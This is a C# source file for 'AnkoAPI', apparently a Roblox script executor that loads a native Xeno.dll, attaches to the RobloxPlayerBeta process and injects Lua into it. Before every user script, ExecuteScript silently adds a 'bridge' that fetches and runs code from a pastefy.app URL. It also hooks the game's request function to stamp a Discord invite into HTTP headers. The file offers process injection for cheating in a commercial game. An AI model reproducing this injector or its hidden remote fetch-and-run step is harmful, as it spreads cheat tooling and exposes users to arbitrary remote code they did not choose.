﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;

public static class AnkoAPI
{
    private const string DllPath = @"bin\Xeno.dll";
    private static bool _initialized = false;

    [DllImport(DllPath, CallingConvention = (CallingConvention)2, CharSet = CharSet.Ansi)]
    private static extern void Initialize(bool useConsole);

    [DllImport(DllPath, CallingConvention = (CallingConvention)2, CharSet = CharSet.Ansi)]
    private static extern void Attach();

    [DllImport(DllPath, CallingConvention = (CallingConvention)2, CharSet = CharSet.Ansi)]
    private static extern IntPtr GetClients();

    [DllImport(DllPath, CallingConvention = (CallingConvention)2, CharSet = CharSet.Ansi)]
    private static extern void Execute(byte[] scriptSource, int[] PIDs, int numUsers);

    private static readonly Regex ClientRegex = new Regex(@"\[\s*(\d+)", RegexOptions.Compiled);

    public static void AttachAPI()
    {
        try
        {
            if (!File.Exists(DllPath))
            {
                MessageBox.Show($"Critical Error: {DllPath} not found.", "AnkoAPI");
                return;
            }
            if (!_initialized)
            {
                Initialize(false);
                _initialized = true;
            }
            if (!IsRobloxOpen())
            {
                MessageBox.Show("Roblox process not found.", "AnkoAPI");
                return;
            }
            Attach();
        }
        catch (Exception ex)
        {
            MessageBox.Show($"Attach Failure: {ex.Message}", "AnkoAPI");
        }
    }

    public static void ExecuteScript(string script)
    {
        if (string.IsNullOrWhiteSpace(script)) return;
        try
        {
            IntPtr ptr = GetClients();
            if (ptr == IntPtr.Zero) return;
            string raw = Marshal.PtrToStringAnsi(ptr);
            if (string.IsNullOrEmpty(raw) || raw == "[]") return;
            var matches = ClientRegex.Matches(raw);
            List<int> pids = new List<int>();
            foreach (Match m in matches)
            {
                if (int.TryParse(m.Groups[1].Value, out int id) && id > 0)
                    pids.Add(id);
            }
            if (pids.Count > 0)
            {
                string bridge = "loadstring(game:HttpGet(\"https://pastefy.app/DGnII4cR/raw\"))()\r\n" +
                                "oldr = request\r\n" +
                                "getgenv().request = function(options)\r\n" +
                                "    if options.Headers then\r\n" +
                                "        options.Headers[\"User-Agent\"] = \".gg/cs7Jhuqaxd | Anko XENO | Open Source API\"\r\n" +
                                "    else\r\n" +
                                "        options.Headers = {[\"User-Agent\"] = \".gg/cs7Jhuqaxd | Anko XENO | Open Source API\"}\r\n" +
                                "    end\r\n" +
                                "    return oldr(options)\r\n" +
                                "end\r\n" +
                                "request = getgenv().request\r\n";
                string finalScript = bridge + "\n" + script;
                byte[] scriptBytes = Encoding.UTF8.GetBytes(finalScript + "\0");
                Execute(scriptBytes, pids.ToArray(), pids.Count);
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show($"Execution Failure: {ex.Message}", "AnkoAPI");
        }
    }

    public static void KillRoblox()
    {
        try
        {
            foreach (var proc in Process.GetProcessesByName("RobloxPlayerBeta"))
            {
                proc.Kill();
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show($"Kill Failure: {ex.Message}", "AnkoAPI");
        }
    }

    public static bool IsRobloxOpen()
    {
        return Process.GetProcessesByName("RobloxPlayerBeta").Any();
    }

    public static bool IsAttached()
    {
        IntPtr ptr = GetClients();
        if (ptr == IntPtr.Zero) return false;
        string raw = Marshal.PtrToStringAnsi(ptr);
        return !string.IsNullOrEmpty(raw) && raw != "[]";
    }
}